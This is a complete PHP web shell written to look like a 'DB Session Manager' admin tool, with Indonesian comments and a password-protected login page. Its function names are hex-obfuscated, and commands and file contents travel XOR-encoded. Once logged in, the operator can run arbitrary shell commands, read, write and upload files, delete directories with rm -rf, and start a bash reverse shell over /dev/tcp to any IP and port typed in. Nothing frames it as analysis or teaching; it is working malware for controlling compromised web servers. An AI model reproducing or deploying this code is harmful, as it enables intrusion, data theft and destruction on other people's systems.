<?php
/**
 * DB Session Manager v2.1
 * Cara Masuk (HP/Desktop): Tap/Klik di bawah teks "Service Unavailable", ketik password, lalu Enter.
 * Password: admin
 */

@session_start();
@error_reporting(0);
@set_time_limit(0);

// Obfuskasi Nama Fungsi (Hex Bypass)
$__f = [
    'se' => "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63", // shell_exec
    'fg' => "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73", // file_get_contents
    'fp' => "\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73", // file_put_contents
    'b6' => "\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65", // base64_decode
    'be' => "\x62\x61\x73\x65\x36\x34\x5f\x65\x6e\x63\x6f\x64\x65"  // base64_encode
];

$k = "gh0st_k3y_123"; // XOR Key
$p = "admin";         // Password Login

// Verifikasi Sesi & User Agent
$u_a = $_SERVER['HTTP_USER_AGENT'];
if (isset($_POST['q1'])) {
    if ($_POST['q1'] === $p) {
        $_SESSION['st'] = md5($p . $u_a);
        setcookie('sys_id', md5($p . $u_a), time() + 86400);
    }
}

$auth = (isset($_SESSION['st']) && $_SESSION['st'] === md5($p . $u_a)) || (isset($_COOKIE['sys_id']) && $_COOKIE['sys_id'] === md5($p . $u_a));

if (!$auth) {
    // Halaman login yang bersih dan mudah dilihat (tanpa error 503)
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Authentication Required</title>
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <style>
            body {
                font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
                background: #e9ecef;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .login-card {
                background: #fff;
                border-radius: 8px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                width: 320px;
                padding: 30px 25px;
                text-align: center;
            }
            .login-card h2 {
                margin-top: 0;
                color: #333;
                font-weight: 500;
            }
            .login-card input {
                width: 100%;
                padding: 12px;
                margin: 20px 0;
                border: 1px solid #ccc;
                border-radius: 4px;
                font-size: 16px;
                box-sizing: border-box;
            }
            .login-card button {
                background: #007bff;
                color: white;
                border: none;
                padding: 12px;
                width: 100%;
                border-radius: 4px;
                font-size: 16px;
                cursor: pointer;
                transition: background 0.2s;
            }
            .login-card button:hover {
                background: #0056b3;
            }
        </style>
    </head>
    <body>
        <div class="login-card">
            <h2>Masukkan Password</h2>
            <form method="post">
                <input type="password" name="q1" placeholder="Password" autofocus>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>';
    exit;
}

// Fungsi XOR
function _x($d, $k) {
    $r = '';
    for($i=0; $i<strlen($d); $i++) {
        $r .= $d[$i] ^ $k[$i % strlen($k)];
    }
    return $r;
}

$p_path = isset($_REQUEST['d']) ? realpath($_REQUEST['d']) : getcwd();
$p_path = str_replace('\\', '/', $p_path);

// --- API ENGINE ---
if (isset($_POST['z'])) {
    $a = $_POST['z'];
    $v = isset($_POST['v1']) ? _x($__f['b6']($_POST['v1']), $k) : '';
    header('Content-Type: text/plain');
    
    switch ($a) {
        case '1': echo $__f['se']($v . " 2>&1"); break; // Exec
        case '2': echo $__f['be'](_x($__f['fg']($p_path . '/' . $v), $k)); break; // Read
        case '3': // Write
            $c = _x($__f['b6']($_POST['c1']), $k);
            echo $__f['fp']($p_path . '/' . $v, $c) !== false ? "OK" : "ER";
            break;
        case '4': // Upload
            if(isset($_FILES['f1'])){
                echo move_uploaded_file($_FILES['f1']['tmp_name'], $p_path . '/' . $_FILES['f1']['name']) ? "OK" : "ER";
            }
            break;
        case '5': echo mkdir($p_path . '/' . $v) ? "OK" : "ER"; break; // Mkdir
        case '6': // Rename
            $n = _x($__f['b6']($_POST['n1']), $k);
            echo rename($p_path . '/' . $v, $p_path . '/' . $n) ? "OK" : "ER";
            break;
    }
    exit;
}

if (isset($_GET['del'])) {
    $f = $p_path . '/' . $_GET['del'];
    if(is_dir($f)) { $__f['se']("rm -rf " . escapeshellarg($f)); } else { unlink($f); }
    header("Location: ?d=$p_path");
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Node Manager</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 10px; font-size: 12px; }
        .card { background: #111; border: 1px solid #222; padding: 10px; margin-bottom: 10px; border-radius: 3px; }
        input, textarea { background: #000; color: #00ff41; border: 1px solid #333; padding: 5px; width: 100%; box-sizing: border-box; margin-top: 5px; }
        .btn { cursor: pointer; color: #000; background: #00ff41; border: none; padding: 5px 10px; font-weight: bold; margin-top: 5px; display: inline-block; }
        .btn-red { background: #ff3e3e; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        td { padding: 8px; border-bottom: 1px solid #222; word-break: break-all; }
        .sh-out { background: #000; color: #0f0; padding: 10px; border: 1px solid #333; height: 150px; overflow: auto; white-space: pre-wrap; margin-top: 10px; }
        a { color: #00ff41; text-decoration: none; }
        .flex { display: flex; gap: 5px; flex-wrap: wrap; }
    </style>
</head>
<body>

    <div class="card">
        <strong>DIR:</strong> <code><?php echo $p_path; ?></code>
    </div>

    <div class="card">
        <input type="text" id="cmd" placeholder="Terminal command...">
        <div class="flex">
            <button class="btn" onclick="run()">EXECUTE</button>
            <button class="btn btn-red" onclick="bc()">BACKCONNECT</button>
        </div>
        <div id="out" class="sh-out">Output ready...</div>
    </div>

    <div class="card">
        <div class="flex">
            <button class="btn" onclick="newF()">+FILE</button>
            <button class="btn" onclick="newD()">+DIR</button>
            <input type="file" id="f1" style="width: auto;">
            <button class="btn" onclick="up()">UPLOAD</button>
        </div>
    </div>

    <div id="ed_box" class="card" style="display:none">
        <h4 id="ed_name" style="margin:0"></h4>
        <textarea id="editor" style="height:300px;"></textarea>
        <div class="flex">
            <button class="btn" onclick="save()">SAVE</button>
            <button class="btn btn-red" onclick="hide()">CLOSE</button>
        </div>
    </div>

    <div class="card" style="padding: 0;">
        <table>
            <?php foreach(scandir($p_path) as $i): if($i==".") continue; $f=$p_path.'/'.$i; $is_d=is_dir($f); ?>
            <tr>
                <td>
                    <?php echo $is_d ? "<b>[D]</b>" : "[F]"; ?> 
                    <a href="?d=<?php echo $is_d ? ($i==".." ? dirname($p_path) : $f) : $p_path; ?>"><?php echo $i; ?></a>
                </td>
                <td style="text-align:right">
                    <?php if(!$is_d): ?><span onclick="edit('<?php echo $i;?>')" style="cursor:pointer">[EDIT]</span><?php endif; ?>
                    <a href="?d=<?php echo $p_path;?>&del=<?php echo $i;?>" style="color:red;margin-left:5px" onclick="return confirm('Kill?')">[DEL]</a>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
    </div>

<script>
const K = "<?php echo $k; ?>";
let cf = "";

function _e(s) {
    let r = "";
    for(let i=0; i<s.length; i++) r += String.fromCharCode(s.charCodeAt(i) ^ K.charCodeAt(i % K.length));
    return btoa(r);
}

function send(a, v, ex={}) {
    let fd = new FormData();
    fd.append('z', a);
    fd.append('v1', _e(v));
    for(let k in ex) fd.append(k, ex[k]);
    return fetch(location.href, {method:'POST', body:fd}).then(r=>r.text());
}

function run() {
    send('1', document.getElementById('cmd').value).then(t => { document.getElementById('out').innerText = t; });
}

function bc() {
    let ip = prompt("IP:"), port = prompt("PORT:");
    if(ip && port) send('1', `bash -i >& /dev/tcp/${ip}/${port} 0>&1`);
}

function up() {
    let fd = new FormData();
    fd.append('z', '4');
    fd.append('f1', document.getElementById('f1').files[0]);
    fetch(location.href, {method:'POST', body:fd}).then(()=>location.reload());
}

function edit(n) {
    cf = n;
    send('2', n).then(t => {
        let d = atob(t), r = "";
        for(let i=0; i<d.length; i++) r += String.fromCharCode(d.charCodeAt(i) ^ K.charCodeAt(i % K.length));
        document.getElementById('editor').value = r;
        document.getElementById('ed_box').style.display = 'block';
        document.getElementById('ed_name').innerText = n;
    });
}

function save() {
    send('3', cf, {c1: _e(document.getElementById('editor').value)}).then(t => { alert(t); hide(); });
}

function newF() { let n = prompt("Name:"); if(n) send('3', n, {c1: _e("")}).then(()=>location.reload()); }
function newD() { let n = prompt("Name:"); if(n) send('5', n).then(()=>location.reload()); }
function hide() { document.getElementById('ed_box').style.display='none'; }
</script>
</body>
</html>